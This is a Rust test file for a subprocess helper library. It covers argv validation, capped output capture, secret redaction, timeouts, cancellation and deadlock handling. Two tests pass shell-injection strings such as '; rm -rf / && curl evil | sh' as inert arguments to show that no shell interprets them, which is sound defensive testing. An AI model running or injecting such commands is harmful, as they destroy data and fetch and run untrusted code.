// SPDX-License-Identifier: MIT

//! Tests for the BigSubprocess spec/exec helpers. Split out of `subprocess.rs`
//! (recipe: file-size budget); as a child module the tests reach the parent's
//! items via `super::*`.

use super::*;

#[test]
fn empty_program_rejected() {
    let spec = BigSubprocessSpec::builder().program("").build();
    let err = spec.try_resolved().unwrap_err();
    assert!(matches!(err, BigSubprocessError::EmptyProgram));
}

#[test]
fn redact_replaces_secret_in_captured_stdout() {
    let mut buf = b"token=ABCDEF rest".to_vec();
    redact_in_place(&["ABCDEF".to_string()], &mut buf);
    assert_eq!(buf, b"token=[REDACTED] rest");
}

#[test]
fn drain_capped_respects_max_bytes() {
    let mut buf: Vec<u8> = Vec::new();
    let payload = vec![b'A'; DEFAULT_MAX_CAPTURE_BYTES + 16];
    let mut cursor = std::io::Cursor::new(payload);
    assert!(matches!(
        drain_capped(&mut cursor, &mut buf),
        Err(BigSubprocessError::OutputLimit { .. })
    ));
    assert!(buf.len() <= DEFAULT_MAX_CAPTURE_BYTES);
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks
// concurrent stdout draining against a real child process.
#[cfg_attr(miri, ignore)]
fn run_does_not_deadlock_on_large_output() {
    // A child writing far more than the OS pipe buffer (~64 KiB) must not
    // deadlock: with a short timeout, the only way this completes is if
    // stdout is drained concurrently while the child runs. Regression for
    // pw-dump (~300 KiB) hanging the full 30 s timeout.
    let bytes = 512 * 1024;
    let spec = BigSubprocessSpec::builder()
        .program("head")
        .arg("-c")
        .arg(bytes.to_string())
        .arg("/dev/zero")
        .timeout(Duration::from_secs(5))
        .build();
    let out = spec.run().expect("head runs without timeout");
    assert!(out.status.success());
    assert_eq!(out.stdout.len(), bytes);
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks
// captured stdout from a real child process.
#[cfg_attr(miri, ignore)]
fn run_captures_stdout() {
    let spec = BigSubprocessSpec::builder()
        .program("echo")
        .arg("hello big-app-kit")
        .timeout(Duration::from_secs(5))
        .build();
    let out = spec.run().expect("echo runs");
    assert!(out.status.success());
    assert!(out.stdout_lossy().contains("hello big-app-kit"));
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks
// detached launch behavior against a real child process.
#[cfg_attr(miri, ignore)]
fn spawn_detached_launches_and_returns() {
    BigSubprocessSpec::builder()
        .program("true")
        .build()
        .spawn_detached()
        .expect("detached true");
}

#[test]
fn forbidden_control_byte_in_program_rejected() {
    for forbidden in ['\u{0}', '\n', '\r', '\u{7f}'] {
        let spec = BigSubprocessSpec::builder()
            .program(format!("ec{forbidden}ho"))
            .build();
        let err = spec.try_resolved().unwrap_err();
        assert!(
            matches!(err, BigSubprocessError::ForbiddenArgvByte { index: 0, byte } if byte == forbidden as u8),
            "byte {:#04x} must be rejected at the program field, got {err:?}",
            forbidden as u32
        );
    }
}

#[test]
fn forbidden_control_byte_in_argv_reports_one_based_index() {
    let spec = BigSubprocessSpec::builder()
        .program("echo")
        .arg("clean")
        .arg("bad\ninjection")
        .build();
    let err = spec.try_resolved().unwrap_err();
    // argv[1] (the second token) carries the newline → reported index 2.
    assert!(
        matches!(
            err,
            BigSubprocessError::ForbiddenArgvByte {
                index: 2,
                byte: 0x0a
            }
        ),
        "got {err:?}"
    );
}

#[test]
fn clean_argv_with_shell_metacharacters_passes_validation() {
    // Shell metacharacters are data (no shell is used); only control bytes are
    // rejected, so a clean-but-spicy argv must resolve OK.
    let spec = BigSubprocessSpec::builder()
        .program("echo")
        .arg("; rm -rf / && curl evil | sh")
        .arg("/tmp/file name.mp4")
        .build();
    assert!(spec.try_resolved().is_ok());
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks
// captured stderr and status code against a real failing child process.
#[cfg_attr(miri, ignore)]
fn captures_stderr_and_exit_code_on_failure() {
    // `ls` on a missing path writes to stderr and exits non-zero (code 2 on
    // GNU coreutils). Exercises BigSubprocessStatus::code + stderr_lossy.
    let out = BigSubprocessSpec::builder()
        .program("ls")
        .arg("/nonexistent_path_xyzzy_42")
        .timeout(Duration::from_secs(5))
        .build()
        .run()
        .expect("ls runs");
    assert!(!out.status.success());
    assert_eq!(out.status.code(), Some(2));
    // Assert the actual stderr content (the offending path) so a constant-return
    // mutant on stderr_lossy cannot survive.
    assert!(
        out.stderr_lossy().contains("/nonexistent_path_xyzzy_42"),
        "stderr should name the missing path: {:?}",
        out.stderr_lossy()
    );
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks
// environment inheritance against a real child process.
#[cfg_attr(miri, ignore)]
fn env_inherited_by_default() {
    // Default specs inherit the parent environment (env_inherit = true), so the
    // child `env` sees PATH. A mutant that flips the env_clear guard drops it.
    let out = BigSubprocessSpec::builder()
        .program("env")
        .timeout(Duration::from_secs(5))
        .build()
        .run()
        .expect("env runs");
    assert!(out.status.success());
    assert!(
        out.stdout_lossy().contains("PATH="),
        "inherited environment must include PATH"
    );
}

/// Reader that yields `chunk`-sized reads (deliberately not a divisor of the
/// capture cap) so the `n.min(remaining)` truncation in `drain_capped` is
/// actually exercised — a chunk-aligned source never hits the partial branch.
struct ChunkedReader {
    remaining: usize,
    chunk: usize,
}

impl std::io::Read for ChunkedReader {
    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        if self.remaining == 0 {
            return Ok(0);
        }
        let n = self.chunk.min(self.remaining).min(buf.len());
        buf[..n].fill(b'A');
        self.remaining -= n;
        Ok(n)
    }
}

/// Reader that returns one injected error, then EOF.
struct ErrorOnceReader(Option<std::io::ErrorKind>);

impl std::io::Read for ErrorOnceReader {
    fn read(&mut self, _: &mut [u8]) -> std::io::Result<usize> {
        match self.0.take() {
            Some(kind) => Err(std::io::Error::from(kind)),
            None => Ok(0),
        }
    }
}

#[test]
fn drain_capped_truncates_unaligned_source_exactly_at_cap() {
    let mut reader = ChunkedReader {
        remaining: DEFAULT_MAX_CAPTURE_BYTES + 8192,
        chunk: 1000,
    };
    let mut buf = Vec::new();
    assert!(matches!(
        drain_capped(&mut reader, &mut buf),
        Err(BigSubprocessError::OutputLimit { .. })
    ));
    assert!(buf.len() <= DEFAULT_MAX_CAPTURE_BYTES);
}

#[test]
fn drain_capped_retries_on_interrupted() {
    let mut reader = ErrorOnceReader(Some(std::io::ErrorKind::Interrupted));
    let mut buf = Vec::new();
    // Interrupted must be retried (continue), not propagated → Ok with no data.
    drain_capped(&mut reader, &mut buf).expect("interrupted is retried");
    assert!(buf.is_empty());
}

#[test]
fn drain_capped_propagates_non_interrupted_error() {
    let mut reader = ErrorOnceReader(Some(std::io::ErrorKind::Other));
    let mut buf = Vec::new();
    let err = drain_capped(&mut reader, &mut buf).unwrap_err();
    assert!(matches!(err, BigSubprocessError::Io(_)), "got {err:?}");
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks that
// flipping the cancel flag kills a long-lived child well under its timeout.
#[cfg_attr(miri, ignore)]
fn run_cancellable_kills_child_on_cancel_flag() {
    use std::sync::Arc;
    use std::sync::atomic::AtomicBool;

    // 5 s sleep with a 30 s timeout: the only way this returns fast is the
    // cancel flag, not the deadline.
    let spec = BigSubprocessSpec::builder()
        .program("sleep")
        .arg("5")
        .timeout(Duration::from_secs(30))
        .build();

    let cancel = Arc::new(AtomicBool::new(false));
    let flipper = Arc::clone(&cancel);
    std::thread::spawn(move || {
        std::thread::sleep(Duration::from_millis(100));
        flipper.store(true, std::sync::atomic::Ordering::Relaxed);
    });

    let start = std::time::Instant::now();
    let err = spec.run_cancellable(&cancel).unwrap_err();
    let elapsed = start.elapsed();

    assert!(
        matches!(err, BigSubprocessError::Cancelled),
        "expected Cancelled, got {err:?}"
    );
    // Killed within one poll tick of the flip, far under the 5 s sleep / 30 s
    // timeout. Generous 2 s bound tolerates loaded CI.
    assert!(
        elapsed < Duration::from_secs(2),
        "cancel must kill fast, took {elapsed:?}"
    );
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks that
// a fast command completes normally when the cancel flag never flips.
#[cfg_attr(miri, ignore)]
fn run_cancellable_returns_output_when_not_cancelled() {
    use std::sync::atomic::AtomicBool;

    let cancel = AtomicBool::new(false);
    let out = BigSubprocessSpec::builder()
        .program("echo")
        .arg("uncancelled")
        .timeout(Duration::from_secs(5))
        .build()
        .run_cancellable(&cancel)
        .expect("echo runs");
    assert!(out.status.success());
    assert!(out.stdout_lossy().contains("uncancelled"));
    assert!(!cancel.load(std::sync::atomic::Ordering::Relaxed));
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks that
// the timeout still fires when neither cancel nor completion happens.
#[cfg_attr(miri, ignore)]
fn run_cancellable_still_times_out_without_cancel() {
    use std::sync::atomic::AtomicBool;

    // Never-flipped cancel + a sleep that outlives the short timeout: the
    // deadline path must still win and report Timeout, not Cancelled.
    let cancel = AtomicBool::new(false);
    let err = BigSubprocessSpec::builder()
        .program("sleep")
        .arg("5")
        .timeout(Duration::from_millis(200))
        .build()
        .run_cancellable(&cancel)
        .unwrap_err();
    assert!(
        matches!(err, BigSubprocessError::Timeout),
        "expected Timeout, got {err:?}"
    );
}

#[test]
fn redaction_survives_non_utf8() {
    let mut buf = b"secret\xffsecret".to_vec();
    redact_in_place(&["secret".to_owned()], &mut buf);
    assert_eq!(buf, b"[REDACTED]\xff[REDACTED]");
}

#[cfg(target_os = "linux")]
#[test]
#[cfg_attr(miri, ignore)]
fn delayed_descendant_output_is_not_discarded() {
    let result = BigSubprocessSpec::builder()
        .program("sh")
        .args(["-c", "(sleep 0.1; printf FINAL) &"])
        .timeout(Duration::from_secs(2))
        .build()
        .run()
        .expect("delayed output");
    assert!(result.status.success());
    assert_eq!(result.stdout, b"FINAL");
}

#[cfg(target_os = "linux")]
#[test]
#[cfg_attr(miri, ignore)]
fn inherited_pipe_and_unread_stdin_obey_deadline() {
    for args in [["-c", "sleep 10"], ["-c", "sleep 10 &"]] {
        let start = std::time::Instant::now();
        let error = BigSubprocessSpec::builder()
            .program("sh")
            .args(args)
            .stdin(vec![0; 1024 * 1024])
            .timeout(Duration::from_millis(150))
            .build()
            .run()
            .unwrap_err();
        assert!(matches!(
            error,
            BigSubprocessError::Timeout | BigSubprocessError::Io(_)
        ));
        assert!(start.elapsed() < Duration::from_secs(3));
    }
}

#[cfg(target_os = "linux")]
#[test]
#[cfg_attr(miri, ignore)]
fn full_duplex_large_input_and_output_do_not_deadlock() {
    let result = BigSubprocessSpec::builder()
        .program("sh")
        .args(["-c", "head -c 131072 /dev/zero; cat >/dev/null"])
        .stdin(vec![7; 1024 * 1024])
        .timeout(Duration::from_secs(5))
        .build()
        .run()
        .unwrap();
    assert!(result.status.success());
    assert_eq!(result.stdout.len(), 131072);
}

#[test]
fn argv_preserves_order_and_separators() {
    let spec = BigSubprocessSpec::builder()
        .program("ffprobe")
        .arg("-of")
        .arg("json")
        .arg("/tmp/x.mp4")
        .build();
    let r = spec.try_resolved().unwrap();
    assert_eq!(r.program, "ffprobe");
    assert_eq!(r.argv, ["-of", "json", "/tmp/x.mp4"]);
}

#[test]
fn argv_never_uses_shell() {
    let spec = BigSubprocessSpec::builder()
        .program("echo")
        .arg("; rm -rf /")
        .arg("&& curl evil")
        .build();
    let r = spec.try_resolved().unwrap();
    assert_eq!(r.argv, ["; rm -rf /", "&& curl evil"]);
    assert_eq!(r.program, "echo");
}

#[test]
fn defaults_are_safe() {
    let spec = BigSubprocessSpec::builder().program("echo").build();
    let r = spec.try_resolved().unwrap();
    assert_eq!(r.stdout, BigSubprocessOutputMode::Capture);
    assert_eq!(r.stderr, BigSubprocessOutputMode::Capture);
    assert_eq!(r.timeout_ms, 30_000);
    assert!(r.env_inherit);
    assert_eq!(r.stdin_len, 0);
}
